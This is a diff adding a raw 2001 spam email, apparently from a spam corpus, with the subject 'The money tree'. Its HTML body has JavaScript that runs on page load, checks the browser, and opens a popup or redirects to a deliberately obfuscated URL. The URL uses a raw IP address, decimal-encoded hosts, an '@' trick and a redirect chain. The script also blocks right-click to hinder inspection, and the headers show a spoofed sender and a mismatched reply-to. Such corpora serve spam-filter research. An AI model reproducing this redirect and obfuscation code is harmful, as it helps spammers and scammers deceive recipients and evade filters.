@@ -1,0 +1,141 @@
+Return-Path: <david@amazonline.com.br>
+Delivered-To: em-ca-design@em.ca
+Received: (qmail 1361 invoked from network); 11 Mar 2001 22:24:00 -0000
+Received: from hermes3.pl.fth.net (HELO smtp-out.fth.net) (193.252.69.59)
+  by em.ca with SMTP; 11 Mar 2001 22:24:00 -0000
+Received: from posseisdn167.the-posse.com_[205.185.1.167] (unknown [205.185.1.167])
+	by smtp-out.fth.net (Postfix) with SMTP
+	id ADA22BAC95; Sun, 11 Mar 2001 23:23:27 +0100 (MET)
+Received: from virtual.umb.edu.co by posseisdn167.the-posse.com with ESMTP; Sun, 11 Mar 2001 16:25:39 -0600
+Message-ID: <00000b220c8e$000038eb$000070f1@virtual.umb.edu.co>
+To: <joe454@desertmail.com>
+From: david@amazonline.com.br
+Subject: The money tree                         28913
+Date: Sun, 11 Mar 2001 16:25:33 -0600
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3
+X-MSMail-Priority: Normal
+Reply-To: andreak@sudanmail.com
+X-Mailer: USANET web-mailer (34WB1.4.03)
+Content-Length: 2621
+Lines: 116
+
+<HTML>
+<BODY>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+
+<HEAD>
+<meta http-equiv=3D"Page-Enter" CONTENT=3D"RevealTrans(Duration=3D4,Transi=
+tion=3D10)">
+<script language=3D"JavaScript"> <!--
+
+var message=3D"Sorry, that function is disabled."; // Message for the aler=
+t box
+
+// Don't edit below!
+function closeit() {
+
+     window.close()
+
+}
+function intro()
+{
+	if ((navigator.appVersion.indexOf("Mac")!=3D-1) &&
+(navigator.userAgent.indexOf("MSIE")!=3D-1) &&
+(parseInt(navigator.appVersion)=3D=3D4))
+	{
+	skip()
+	}
+	else 
+	{ 
+	popup()
+	}
+
+}
+function skip()
+{
+	location.href=3D"http://www.hongkong.com";
+}
+function popup()
+{
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	version =3D parseFloat(navigator.appVersion.substring(navigator.appVersio=
+n.indexOf('.')-1,navigator.appVersion.length));
+	if (version >=3D 4)
+	
+	{
+	if (navigator.appName=3D=3D"Netscape")
+ {
+    Hello =3D window.open("http://216.32.74.52/stealth.cgi=3Dkey57985//htt=
+p://3472742688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-ny=
+ry.htm@3487677690/FreeSites/912476/default.asp?redirect=3Dangelfire.lycos.=
+com/ogoqstn/purvbrqfb/ufzd.htm","Hello","scrollbars");
+    Hello.focus();
+                
+}
+
+		
+if (navigator.appName=3D=3D"Microsoft Internet Explorer")
+		{
+			window.open("http://216.32.74.52/stealth.cgi=3Dkey57985//http://3472742=
+688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-nyry.htm@3487=
+677690/FreeSites/912476/default.asp?redirect=3Dangelfire.lycos.com/ogoqstn=
+/purvbrqfb/ufzd.htm","screen");
+		}
+	}
+	else
+	{
+		location.href=3D"http://216.32.74.52/stealth.cgi=3Dkey57985//http://3472=
+742688/apache2i8/convert.cgi/?http://996.682.889.0-aasrdh-gouri-nyry.htm@3=
+487677690/FreeSites/912476/default.asp?redirect=3Dangelfire.lycos.com/ogoq=
+stn/purvbrqfb/ufzd.htm";
+	}
+
+}
+function click(e) {
+if (document.all) {
+if (event.button =3D=3D 2) {
+alert(message);
+return false;
+}
+}
+if (document.layers) {
+if (e.which =3D=3D 3) {
+alert(message);
+return false;
+}
+}
+}
+if (document.layers) {
+document.captureEvents(Event.MOUSEDOWN);
+}
+document.onmousedown=3Dclick;
+// --> </script>
+
+	<META NAME=3D"GENERATOR" Content=3D"Visual Page 1.0 for Windows">
+	<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;CHARSET=3Diso-8859=
+-1">
+	<TITLE>Hello</TITLE>
+</HEAD>
+
+<BODY BGCOLOR=3D"#0000AA" LINK=3D"#000000" onLoad=3D"intro()">
+
+<P><SCRIPT LANGUAGE=3D"Javascript">
+</SCRIPT>
+ </BODY>
+
+</HTML>
+<p><p><p><p><p><p><p><p><p><p>
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN"><p><p><p><p><p>
+</BODY>
+</HTML>
+
+
